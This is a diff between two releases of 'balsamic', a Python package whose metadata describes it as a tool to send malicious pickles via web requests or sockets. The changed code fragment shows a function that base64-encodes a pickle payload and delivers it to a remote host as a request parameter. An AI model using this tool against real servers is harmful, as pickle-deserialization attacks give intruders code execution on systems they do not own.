# Comparing `tmp/balsamic-0.1.97.tar.gz` & `tmp/balsamic-0.1.98.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "balsamic-0.1.97.tar", last modified: Sat May 18 03:26:26 2024, max compression
+gzip compressed data, was "balsamic-0.1.98.tar", last modified: Sat May 18 03:29:49 2024, max compression
```

## Comparing `balsamic-0.1.97.tar` & `balsamic-0.1.98.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:26:26.332955 balsamic-0.1.97/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2237 2024-05-18 03:26:26.332955 balsamic-0.1.97/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1702 2024-05-18 03:04:59.000000 balsamic-0.1.97/README.md
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:26:26.332955 balsamic-0.1.97/balsamic/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.97/balsamic/__innit__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2226 2024-05-18 02:50:42.000000 balsamic-0.1.97/balsamic/__main__.py
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1792 2024-05-18 03:25:49.000000 balsamic-0.1.97/balsamic/balsamic.py
-drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:26:26.332955 balsamic-0.1.97/balsamic.egg-info/
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2237 2024-05-18 03:26:26.000000 balsamic-0.1.97/balsamic.egg-info/PKG-INFO
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 03:26:26.000000 balsamic-0.1.97/balsamic.egg-info/SOURCES.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 03:26:26.000000 balsamic-0.1.97/balsamic.egg-info/dependency_links.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:26:26.000000 balsamic-0.1.97/balsamic.egg-info/requires.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:26:26.000000 balsamic-0.1.97/balsamic.egg-info/top_level.txt
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 03:26:26.332955 balsamic-0.1.97/setup.cfg
--rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-18 03:26:10.000000 balsamic-0.1.97/setup.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:29:49.175643 balsamic-0.1.98/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2237 2024-05-18 03:29:49.175643 balsamic-0.1.98/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1702 2024-05-18 03:04:59.000000 balsamic-0.1.98/README.md
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:29:49.175643 balsamic-0.1.98/balsamic/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-17 19:32:39.000000 balsamic-0.1.98/balsamic/__innit__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2226 2024-05-18 02:50:42.000000 balsamic-0.1.98/balsamic/__main__.py
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1792 2024-05-18 03:29:29.000000 balsamic-0.1.98/balsamic/balsamic.py
+drwxr-xr-x   0 witchdoc  (1000) witchdoc  (1001)        0 2024-05-18 03:29:49.175643 balsamic-0.1.98/balsamic.egg-info/
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     2237 2024-05-18 03:29:49.000000 balsamic-0.1.98/balsamic.egg-info/PKG-INFO
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)      241 2024-05-18 03:29:49.000000 balsamic-0.1.98/balsamic.egg-info/SOURCES.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        1 2024-05-18 03:29:49.000000 balsamic-0.1.98/balsamic.egg-info/dependency_links.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:29:49.000000 balsamic-0.1.98/balsamic.egg-info/requires.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)        9 2024-05-18 03:29:49.000000 balsamic-0.1.98/balsamic.egg-info/top_level.txt
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)       38 2024-05-18 03:29:49.175643 balsamic-0.1.98/setup.cfg
+-rw-r--r--   0 witchdoc  (1000) witchdoc  (1001)     1144 2024-05-18 03:29:32.000000 balsamic-0.1.98/setup.py
```

### Comparing `balsamic-0.1.97/PKG-INFO` & `balsamic-0.1.98/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.97
+Version: 0.1.98
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.1.97/README.md` & `balsamic-0.1.98/README.md`

 * *Files identical despite different names*

### Comparing `balsamic-0.1.97/balsamic/__main__.py` & `balsamic-0.1.98/balsamic/__main__.py`

 * *Files identical despite different names*

### Comparing `balsamic-0.1.97/balsamic/balsamic.py` & `balsamic-0.1.98/balsamic/balsamic.py`

 * *Files 2% similar despite different names*

```diff
@@ -24,15 +24,15 @@
 
 def updatecmd(newcmd):
 	utility.command=newcmd
 
 def webreq(schema,method,rhost,rport,payload,param=None,cook=None):
 	methods=["get","post","put","patch"]
 	payload=utility.b64pickle(payload)
-	payload=payload.encode("utf-8")
+	payload=payload.decode("utf-8")
 	if method in methods:
 		r=getattr(requests,method)
 	if param:
 		if method == "get":
 			r(f"{schema}://{rhost}:{rport}/?{param}={payload}")
 		else:
 			data={param:payload}
```

### Comparing `balsamic-0.1.97/balsamic.egg-info/PKG-INFO` & `balsamic-0.1.98/balsamic.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: balsamic
-Version: 0.1.97
+Version: 0.1.98
 Summary: Send malicious pickles via requests or sockets
 Author: Witchdoctor (malectrica)
 Keywords: python,hack,pickle,serialization,security,sockets,web
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `balsamic-0.1.97/setup.py` & `balsamic-0.1.98/setup.py`

 * *Files 11% similar despite different names*

```diff
@@ -3,15 +3,15 @@
 import os
 
 here = os.path.abspath(os.path.dirname(__file__))
 
 with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
     long_description = "\n" + fh.read()
 
-VERSION = '0.1.97'
+VERSION = '0.1.98'
 DESCRIPTION = 'Send malicious pickles via requests or sockets'
 LONG_DESCRIPTION = 'A package that allows the user to easily send out malicious pickles, via web requests, or a malicious server or client(currently ipv4 only)'
 
 # Setting up
 setup(
     name="balsamic",
     version=VERSION,
```

